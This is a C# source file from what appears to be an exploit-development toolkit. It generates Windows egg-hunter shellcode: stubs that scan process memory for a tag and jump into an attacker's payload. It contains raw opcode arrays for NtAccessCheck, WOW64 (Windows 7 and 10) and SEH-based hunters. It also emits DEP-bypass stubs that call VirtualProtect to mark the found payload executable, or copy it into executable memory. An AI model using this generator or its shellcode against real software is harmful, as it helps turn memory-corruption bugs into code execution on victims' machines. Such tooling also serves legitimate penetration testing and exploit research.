using System;
using System.Collections.Generic;
using System.Text;

namespace ERC.Utilities
{
    /// <summary>Which WOW64 syscall stub to emit.</summary>
    public enum Wow64WindowsVersion
    {
        /// <summary>Both the Windows 7 and Windows 10 stubs.</summary>
        Both = 0,

        /// <summary>Syscall 0x26, the Windows 7 WOW64 number.</summary>
        Win7 = 7,

        /// <summary>Syscall 0x29, the Windows 10+ WOW64 number.</summary>
        Win10 = 10
    }

    /// <summary>How the hunter should make the found egg executable.</summary>
    public enum EggHunterDepMethod
    {
        /// <summary>Just <c>jmp edi</c> into the egg.</summary>
        None = 0,

        /// <summary>
        /// <c>VirtualProtect(egg, size, PAGE_EXECUTE_READWRITE, esp)</c> then return
        /// into the egg. The API pointer is in <see cref="EggHunterRequest.DepRegister"/>.
        /// </summary>
        VirtualProtect,

        /// <summary>
        /// Copy the egg onto the hunter (already executable) and jump there.
        /// </summary>
        Copy,

        /// <summary>As <see cref="Copy"/>, but the copy size is pushed explicitly.</summary>
        CopySize
    }

    /// <summary>Options for <see cref="EggHunter.Generate"/>.</summary>
    public sealed class EggHunterRequest
    {
        /// <summary>Four-character tag the hunter searches for. Default ERCD.</summary>
        public string Tag { get; set; } = Payloads.DefaultEgg;

        /// <summary>
        /// If set, search starts at this register rather than from the bottom of
        /// the address space. x86 hunters use EDX as the scan pointer, so this is
        /// <c>mov edx, reg</c> plus a jump that skips the page-align.
        /// </summary>
        public string? StartRegister { get; set; }

        /// <summary>
        /// If set, the hunter checksums this payload after the egg and skips a
        /// truncated copy. The byte to append after the payload is
        /// <see cref="EggHunterStub.ChecksumByte"/>.
        /// </summary>
        public byte[]? ChecksumPayload { get; set; }

        /// <summary>WOW64 stubs to include.</summary>
        public Wow64WindowsVersion Wow64 { get; set; }

        /// <summary>DEP bypass to run on the found egg, if any.</summary>
        public EggHunterDepMethod DepMethod { get; set; }

        /// <summary>
        /// Register that holds a pointer to the DEP API (VirtualProtect or a copy
        /// routine). Default ESI, as in mona.
        /// </summary>
        public string DepRegister { get; set; } = "esi";

        /// <summary>
        /// Size in bytes for the DEP routine. 0 means derive it from
        /// <see cref="ChecksumPayload"/> when that is set.
        /// </summary>
        public int DepSize { get; set; }

        /// <summary>
        /// Register pointing at the hunter itself, for copy-to-self. Empty means
        /// emit a GetPC into ESI's first free neighbour.
        /// </summary>
        public string? DepDestination { get; set; }
    }

    /// <summary>One generated hunter.</summary>
    public sealed class EggHunterStub
    {
        internal EggHunterStub(string name, string description, byte[] opcodes, byte? checksumByte)
        {
            Name = name;
            Description = description;
            Opcodes = opcodes;
            ChecksumByte = checksumByte;
        }

        /// <summary>Short name, for example "NtAccessCheck".</summary>
        public string Name { get; }

        /// <summary>When to use this stub.</summary>
        public string Description { get; }

        /// <summary>The hunter bytes, tag already substituted.</summary>
        public byte[] Opcodes { get; }

        /// <summary>
        /// Byte to append after tag+tag+payload so the checksum matches. Null when
        /// the hunter has no checksum.
        /// </summary>
        public byte? ChecksumByte { get; }
    }

    /// <summary>
    /// Builds egg hunters: small stubs that search process memory for a four-byte
    /// tag and jump to the payload that follows it.
    /// </summary>
    /// <remarks>
    /// ERC used to ship four fixed templates with a swappable tag. mona's
    /// <c>egghunter</c> also starts the scan at a register, checksums the found
    /// egg so a truncated copy is skipped, emits WOW64 stubs per OS (the syscall
    /// number moved), and can VirtualProtect or copy the egg before jumping to it.
    /// Those are the options that decide whether the hunter actually finds the
    /// payload the user placed.
    /// </remarks>
    public static class EggHunter
    {
        private static readonly string[] Gp32 =
        {
            "eax", "ecx", "edx", "ebx", "esp", "ebp", "esi", "edi"
        };

        // Skape NtAccessCheckAndAuditAlarm hunter, without the final jmp edi.
        // INC EDX sits at offset 5; checksum fail jumps back there.
        private static readonly byte[] NtAccessCheckBody =
        {
            0x66, 0x81, 0xCA, 0xFF, 0x0F, 0x42, 0x52, 0x6A, 0x02, 0x58,
            0xCD, 0x2E, 0x3C, 0x05, 0x5A, 0x74, 0xEF, 0xB8, 0x45, 0x52,
            0x43, 0x44, 0x8B, 0xFA, 0xAF, 0x75, 0xEA, 0xAF, 0x75, 0xE7
        };

        // WOW64 Windows 7: Heaven's Gate via fs:[0xC0], syscall 0x26.
        private static readonly byte[] Wow64Win7Body =
        {
            0x31, 0xDB, 0x53, 0x53, 0x53, 0x53, 0xB3, 0xC0, 0x66, 0x81,
            0xCA, 0xFF, 0x0F, 0x42, 0x52, 0x6A, 0x26, 0x58, 0x33, 0xC9,
            0x8B, 0xD4, 0x64, 0xFF, 0x13, 0x5E, 0x5A, 0x3C, 0x05, 0x74,
            0xE9, 0xB8, 0x45, 0x52, 0x43, 0x44, 0x8B, 0xFA, 0xAF, 0x75,
            0xE4, 0xAF, 0x75, 0xE1
        };

        // WOW64 Windows 10+: syscall 0x29. INC EDX at offset 9.
        private static readonly byte[] Wow64Win10Body =
        {
            0x33, 0xD2, 0x66, 0x81, 0xCA, 0xFF, 0x0F, 0x33, 0xDB, 0x42,
            0x53, 0x53, 0x52, 0x53, 0x53, 0x53, 0x6A, 0x29, 0x58, 0xB3,
            0xC0, 0x64, 0xFF, 0x13, 0x83, 0xC4, 0x0C, 0x5A, 0x83, 0xC4,
            0x08, 0x3C, 0x05, 0x74, 0xDF, 0xB8, 0x45, 0x52, 0x43, 0x44,
            0x8B, 0xFA, 0xAF, 0x75, 0xDA, 0xAF, 0x75, 0xD7
        };

        // Corelan 2019 SEH hunter. Four 0xCC bytes are a p/p/r placeholder.
        private static readonly byte[] SehHunter =
        {
            0xE8, 0xFF, 0xFF, 0xFF, 0xFF, 0xC3, 0x59, 0x83, 0xC1, 0x1D,
            0x31, 0xDB, 0x51, 0x51, 0x68, 0x5C, 0x58, 0xC3, 0x90, 0x68,
            0xCC, 0xCC, 0xCC, 0xCC, 0x68, 0x58, 0x58, 0xEB, 0x04, 0x64,
            0x89, 0x23, 0xEB, 0x0D, 0x83, 0xEC, 0x14, 0x31, 0xDB, 0x64,
            0x89, 0x23, 0x8B, 0x54, 0x24, 0x24, 0x42, 0x66, 0x81, 0xCA,
            0xFF, 0x0F, 0x42, 0x89, 0x54, 0x24, 0x24, 0xB8, 0x45, 0x52,
            0x43, 0x44, 0x89, 0xD7, 0xAF, 0x75, 0xF1, 0xAF, 0x75, 0xEE,
            0xFF, 0xE7
        };

        /// <summary>
        /// Reads the positional arguments of <c>ERC --egghunters</c>.
        /// </summary>
        /// <returns>Null and <paramref name="error"/> when the line cannot be used.</returns>
        public static EggHunterRequest? TryParse(IReadOnlyList<string> arguments, out string? error)
        {
            error = null;
            var request = new EggHunterRequest();
            int i = 0;

            if (arguments.Count > 0 && arguments[0].Length == 4 && !IsKeyword(arguments[0]))
            {
                request.Tag = arguments[0];
                i = 1;
            }

            while (i < arguments.Count)
            {
                string token = arguments[i].ToLowerInvariant();

                if (token == "startreg")
                {
                    if (i + 1 >= arguments.Count)
                    {
                        error = "startreg takes a register. Example: ERC --egghunters startreg eax";
                        return null;
                    }

                    request.StartRegister = arguments[i + 1];
                    i += 2;
                    continue;
                }

                if (token == "checksum")
                {
                    if (i + 1 >= arguments.Count)
                    {
                        error = "checksum takes the payload as hex bytes or a file path.";
                        return null;
                    }

                    var rest = new List<string>();
                    for (int j = i + 1; j < arguments.Count && !IsKeyword(arguments[j]); j++)
                    {
                        rest.Add(arguments[j]);
                    }

                    byte[]? payload = ReadPayload(rest);
                    if (payload == null)
                    {
                        error = "checksum takes the payload as hex bytes or a file that contains them.";
                        return null;
                    }

                    request.ChecksumPayload = payload;
                    i += 1 + rest.Count;
                    continue;
                }

                if (token == "wow64")
                {
                    if (i + 1 < arguments.Count && (arguments[i + 1] == "7" || arguments[i + 1] == "10"))
                    {
                        request.Wow64 = arguments[i + 1] == "7"
                            ? Wow64WindowsVersion.Win7
                            : Wow64WindowsVersion.Win10;
                        i += 2;
                    }
                    else
                    {
                        request.Wow64 = Wow64WindowsVersion.Win10;
                        i += 1;
                    }

                    continue;
                }

                if (token == "depmethod")
                {
                    if (i + 1 >= arguments.Count)
                    {
                        error = "depmethod is virtualprotect, copy or copy_size.";
                        return null;
                    }

                    string method = arguments[i + 1].ToLowerInvariant().Replace("_", "");
                    if (method == "virtualprotect")
                    {
                        request.DepMethod = EggHunterDepMethod.VirtualProtect;
                    }
                    else if (method == "copy")
                    {
                        request.DepMethod = EggHunterDepMethod.Copy;
                    }
                    else if (method == "copysize")
                    {
                        request.DepMethod = EggHunterDepMethod.CopySize;
                    }
                    else
                    {
                        error = "depmethod is virtualprotect, copy or copy_size.";
                        return null;
                    }

                    i += 2;
                    continue;
                }

                if (token == "depreg")
                {
                    if (i + 1 >= arguments.Count)
                    {
                        error = "depreg takes a register. Default is esi.";
                        return null;
                    }

                    request.DepRegister = arguments[i + 1];
                    i += 2;
                    continue;
                }

                if (token == "depsize")
                {
                    if (i + 1 >= arguments.Count)
                    {
                        error = "depsize takes a byte count.";
                        return null;
                    }

                    int size;
                    if (!int.TryParse(arguments[i + 1], out size) || size <= 0)
                    {
                        error = "depsize takes a positive byte count.";
                        return null;
                    }

                    request.DepSize = size;
                    i += 2;
                    continue;
                }

                if (token == "depdest")
                {
                    if (i + 1 >= arguments.Count)
                    {
                        error = "depdest takes a register pointing at the hunter.";
                        return null;
                    }

                    request.DepDestination = arguments[i + 1];
                    i += 2;
                    continue;
                }

                error = "Unknown egghunter option \"" + arguments[i] +
                        "\". Use startreg, checksum, wow64, depmethod, depreg, depsize or depdest.";
                return null;
            }

            return request;
        }

        /// <summary>
        /// Builds the hunters requested by <paramref name="request"/>.
        /// </summary>
        public static IReadOnlyList<EggHunterStub> Generate(EggHunterRequest? request = null)
        {
            request = request ?? new EggHunterRequest();
            string tag = ValidateTag(request.Tag);
            byte[] tagBytes = Encoding.ASCII.GetBytes(tag);

            int startReg = -1;
            if (!string.IsNullOrEmpty(request.StartRegister))
            {
                startReg = IndexOf32(request.StartRegister!);
                if (startReg < 0)
                {
                    throw new ERCException(
                        "startreg must be a 32-bit register: eax, ecx, edx, ebx, esp, ebp, esi or edi.");
                }
            }

            byte[]? payload = request.ChecksumPayload;
            byte? checksumByte = null;
            if (payload != null)
            {
                if (payload.Length == 0 || payload.Length >= 65536)
                {
                    throw new ERCException(
                        "checksum payload must be between 1 and 65535 bytes.");
                }

                checksumByte = ChecksumOf(payload);
            }

            int depReg = IndexOf32(request.DepRegister);
            if (request.DepMethod != EggHunterDepMethod.None && depReg < 0)
            {
                throw new ERCException(
                    "depreg must be a 32-bit register. Default is esi.");
            }

            int destReg = -1;
            if (!string.IsNullOrEmpty(request.DepDestination))
            {
                destReg = IndexOf32(request.DepDestination!);
                if (destReg < 0)
                {
                    throw new ERCException(
                        "depdest must be a 32-bit register.");
                }
            }

            int depSize = request.DepSize;
            if (request.DepMethod != EggHunterDepMethod.None && depSize <= 0)
            {
                if (payload != null)
                {
                    depSize = request.DepMethod == EggHunterDepMethod.CopySize
                        ? payload.Length
                        : payload.Length * 2;
                }

                if (depSize <= 0)
                {
                    throw new ERCException(
                        "depmethod needs depsize, or a checksum payload to take the size from.");
                }
            }

            var hunters = new List<EggHunterStub>();

            hunters.Add(BuildEdxHunter(
                "NtAccessCheck",
                "32-bit. Uses NtAccessCheckAndAuditAlarm (int 0x2E, eax=2) to walk pages. Native 32-bit OS only, not WOW64.",
                NtAccessCheckBody, 5, tagBytes, startReg, payload, checksumByte,
                request.DepMethod, depReg, destReg, depSize));

            hunters.Add(new EggHunterStub(
                "SEH",
                "32-bit. Walks pages by triggering access violations; no syscall. Replace the four 0xCC bytes with a pop/pop/ret.",
                SubstituteTag((byte[])SehHunter.Clone(), tagBytes),
                null));

            if (request.Wow64 == Wow64WindowsVersion.Both ||
                request.Wow64 == Wow64WindowsVersion.Win7)
            {
                hunters.Add(BuildEdxHunter(
                    "WOW64 Windows 7",
                    "32-bit process on 64-bit Windows 7. Syscall 0x26 through fs:[0xC0].",
                    Wow64Win7Body, 13, tagBytes, startReg, payload, checksumByte,
                    request.DepMethod, depReg, destReg, depSize));
            }

            if (request.Wow64 == Wow64WindowsVersion.Both ||
                request.Wow64 == Wow64WindowsVersion.Win10)
            {
                hunters.Add(BuildEdxHunter(
                    "WOW64 Windows 10",
                    "32-bit process on 64-bit Windows 10 or 11. Syscall 0x29 through fs:[0xC0].",
                    Wow64Win10Body, 9, tagBytes, startReg, payload, checksumByte,
                    request.DepMethod, depReg, destReg, depSize));
            }

            hunters.Add(new EggHunterStub(
                "WOW64 auto",
                "32-bit process; detects native 32-bit vs WOW64 at run time. The Win7/Win10 stubs above are the ones to use when the OS is known.",
                SubstituteTag((byte[])Payloads.EggHunterWOW64.Clone(), tagBytes),
                null));

            hunters.Add(new EggHunterStub(
                "x64 syscall",
                "64-bit process. Uses NtAccessCheckAndAuditAlarm (eax=0x29) through the WOW64 gate.",
                SubstituteTag((byte[])Payloads.EggHunter641.Clone(), tagBytes),
                null));

            hunters.Add(new EggHunterStub(
                "x64 scan",
                "64-bit process. Linear scan from RSP; no syscall. Smallest, but will AV on an unmapped page.",
                SubstituteTag((byte[])Payloads.EggHunter642.Clone(), tagBytes),
                null));

            return hunters;
        }

        /// <summary>Sum of <paramref name="payload"/> modulo 256.</summary>
        public static byte ChecksumOf(byte[] payload)
        {
            int sum = 0;
            for (int i = 0; i < payload.Length; i++)
            {
                sum += payload[i];
            }

            return (byte)sum;
        }

        /// <summary>True when <paramref name="name"/> is a 32-bit general-purpose register.</summary>
        public static bool IsRegister32(string? name)
        {
            return IndexOf32(name) >= 0;
        }

        private static EggHunterStub BuildEdxHunter(
            string name, string description, byte[] body, int incEdxOffset,
            byte[] tagBytes, int startReg, byte[]? payload, byte? checksumByte,
            EggHunterDepMethod dep, int depReg, int destReg, int depSize)
        {
            byte[] hunter = SubstituteTag((byte[])body.Clone(), tagBytes);
            var built = new List<byte>(hunter);

            if (payload != null)
            {
                built.AddRange(ChecksumStub(hunter.Length, incEdxOffset, payload.Length));
            }

            byte[] getPc;
            byte[] jmp = DepStub(dep, depReg, destReg, depSize, out getPc);
            built.AddRange(getPc);
            built.AddRange(jmp);

            byte[] skip = startReg >= 0 ? new byte[] { 0xEB, 0x05 } : new byte[0];
            byte[] startAt = startReg >= 0 && startReg != 2
                ? new byte[] { 0x8B, (byte)(0xD0 | startReg) }
                : new byte[0];

            var result = new List<byte>(startAt.Length + skip.Length + built.Count);
            result.AddRange(startAt);
            result.AddRange(skip);
            result.AddRange(built);

            return new EggHunterStub(name, description, result.ToArray(), checksumByte);
        }

        /// <summary>
        /// Checksum loop mona appends: sum bytes at [edi], compare with the byte
        /// immediately after the payload, otherwise go back to INC EDX.
        /// </summary>
        private static byte[] ChecksumStub(int hunterLength, int incEdxOffset, int payloadLength)
        {
            byte[] compare;
            byte loopOffset;
            if (payloadLength < 256)
            {
                compare = new byte[] { 0x80, 0xF9, (byte)payloadLength };
                loopOffset = 0xF7;
            }
            else
            {
                compare = new byte[]
                {
                    0x66, 0x81, 0xF9,
                    (byte)payloadLength, (byte)(payloadLength >> 8)
                };
                loopOffset = 0xF5;
            }

            // 15 static bytes + compare + the two rel8 bytes of the jnz itself.
            const int staticBytes = 15;
            int failDisplacement = -(hunterLength - incEdxOffset + staticBytes + compare.Length + 2);
            if (failDisplacement < -128 || failDisplacement > 127)
            {
                throw new ERCException(
                    "checksum fail jump does not fit in a short displacement; the hunter is too long.");
            }

            var stub = new List<byte>
            {
                0x51, 0x31, 0xC9, 0x31, 0xC0, 0x02, 0x04, 0x0F, 0x41
            };
            stub.AddRange(compare);
            stub.Add(0x75);
            stub.Add(loopOffset);
            stub.Add(0x3A);
            stub.Add(0x04);
            stub.Add(0x39);
            stub.Add(0x59);
            stub.Add(0x75);
            stub.Add((byte)failDisplacement);
            return stub.ToArray();
        }

        private static byte[] DepStub(
            EggHunterDepMethod method, int depReg, int destReg, int depSize, out byte[] getPc)
        {
            getPc = new byte[0];
            if (method == EggHunterDepMethod.None)
            {
                return new byte[] { 0xFF, 0xE7 };
            }

            int sizeReg;
            int dest = destReg;
            ResolveDepRegisters(method, depReg, ref dest, out sizeReg, out getPc);

            var bytes = new List<byte>();
            if (method == EggHunterDepMethod.VirtualProtect)
            {
                bytes.Add(0x54); // push esp  (lpflOldProtect)
                bytes.Add(0x6A);
                bytes.Add(0x40); // push 0x40 PAGE_EXECUTE_READWRITE
                bytes.AddRange(PushSize(depSize, sizeReg));
                bytes.Add(0x57); // push edi  (lpAddress)
                bytes.Add(0x57); // push edi  (return = egg)
                bytes.Add((byte)(0x50 | depReg));
                bytes.Add(0xC3);
                return bytes.ToArray();
            }

            if (method == EggHunterDepMethod.CopySize)
            {
                bytes.AddRange(PushSize(depSize, sizeReg));
            }

            bytes.Add(0x57);                       // push edi (src)
            bytes.Add((byte)(0x50 | dest));        // push dest
            bytes.Add((byte)(0x50 | dest));        // push dest (return)
            bytes.Add((byte)(0x50 | depReg));      // push API
            bytes.Add(0x8B);
            bytes.Add((byte)(0xF8 | dest));        // mov edi, dest
            bytes.Add(0xC3);
            return bytes.ToArray();
        }

        private static void ResolveDepRegisters(
            EggHunterDepMethod method, int depReg, ref int dest, out int sizeReg, out byte[] getPc)
        {
            getPc = new byte[0];
            var free = new List<int> { 3, 1, 5, 6 }; // ebx, ecx, ebp, esi
            if (!free.Contains(depReg))
            {
                throw new ERCException(
                    "depreg must be ebx, ecx, ebp or esi so the DEP stub has working space.");
            }

            free.Remove(depReg);

            if (method == EggHunterDepMethod.Copy || method == EggHunterDepMethod.CopySize)
            {
                if (dest < 0)
                {
                    dest = free[0];
                    getPc = new byte[] { 0xD9, 0xEE, 0xD9, 0x74, 0xE4, 0xF4, (byte)(0x58 | dest) };
                }
                else if (!free.Contains(dest) && dest != depReg)
                {
                    throw new ERCException(
                        "depdest must be ebx, ecx, ebp or esi, and different from depreg.");
                }

                if (dest == depReg)
                {
                    throw new ERCException("depdest and depreg cannot be the same register.");
                }

                free.Remove(dest);
            }

            sizeReg = free[0];
        }

        private static byte[] PushSize(int size, int sizeReg)
        {
            if (size <= 0 || size > 65535)
            {
                throw new ERCException("depsize must be between 1 and 65535.");
            }

            if (size <= 127)
            {
                return new byte[] { 0x6A, (byte)size };
            }

            var bytes = new List<byte>
            {
                0x31, (byte)(0xC0 | sizeReg | (sizeReg << 3)), // xor r, r
                0x66, (byte)(0xB8 | sizeReg),
                (byte)size,
                (byte)(size >> 8),
                (byte)(0x50 | sizeReg)
            };
            return bytes.ToArray();
        }

        private static byte[] SubstituteTag(byte[] hunter, byte[] tag)
        {
            byte[] original = Encoding.ASCII.GetBytes(Payloads.DefaultEgg);
            for (int i = 0; i <= hunter.Length - 4; i++)
            {
                if (hunter[i] == original[0] && hunter[i + 1] == original[1] &&
                    hunter[i + 2] == original[2] && hunter[i + 3] == original[3])
                {
                    hunter[i] = tag[0];
                    hunter[i + 1] = tag[1];
                    hunter[i + 2] = tag[2];
                    hunter[i + 3] = tag[3];
                    return hunter;
                }
            }

            return hunter;
        }

        private static string ValidateTag(string? tag)
        {
            if (tag == null)
            {
                return Payloads.DefaultEgg;
            }

            if (tag.Length != 4)
            {
                throw new ArgumentException(
                    "Egg hunter tag must be exactly 4 characters long. Received \"" + tag +
                    "\" (" + tag.Length + " characters).", "tag");
            }

            return tag;
        }

        private static bool IsKeyword(string token)
        {
            string t = token.ToLowerInvariant();
            return t == "startreg" || t == "checksum" || t == "wow64" ||
                   t == "depmethod" || t == "depreg" || t == "depsize" || t == "depdest";
        }

        private static byte[]? ReadPayload(IReadOnlyList<string> parts)
        {
            if (parts.Count == 0)
            {
                return null;
            }

            if (parts.Count == 1 && System.IO.File.Exists(parts[0]))
            {
                return System.IO.File.ReadAllBytes(parts[0]);
            }

            string joined = string.Join("", parts)
                .Replace("0x", string.Empty)
                .Replace("0X", string.Empty)
                .Replace("\\x", string.Empty)
                .Replace("\\X", string.Empty);

            byte[]? bytes = ParseHex(joined);
            if (bytes != null && bytes.Length > 0)
            {
                return bytes;
            }

            string path = string.Join(" ", parts);
            if (System.IO.File.Exists(path))
            {
                return System.IO.File.ReadAllBytes(path);
            }

            return null;
        }

        private static byte[]? ParseHex(string cleaned)
        {
            if (cleaned.Length == 0 || cleaned.Length % 2 != 0)
            {
                return null;
            }

            var bytes = new byte[cleaned.Length / 2];
            for (int i = 0; i < bytes.Length; i++)
            {
                int hi = Nibble(cleaned[i * 2]);
                int lo = Nibble(cleaned[i * 2 + 1]);
                if (hi < 0 || lo < 0)
                {
                    return null;
                }

                bytes[i] = (byte)((hi << 4) | lo);
            }

            return bytes;
        }

        private static int Nibble(char c)
        {
            if (c >= '0' && c <= '9')
            {
                return c - '0';
            }

            if (c >= 'a' && c <= 'f')
            {
                return c - 'a' + 10;
            }

            if (c >= 'A' && c <= 'F')
            {
                return c - 'A' + 10;
            }

            return -1;
        }

        private static int IndexOf32(string? name)
        {
            if (string.IsNullOrEmpty(name))
            {
                return -1;
            }

            string n = name!.Trim().ToLowerInvariant();
            for (int i = 0; i < Gp32.Length; i++)
            {
                if (Gp32[i] == n)
                {
                    return i;
                }
            }

            return -1;
        }
    }
}
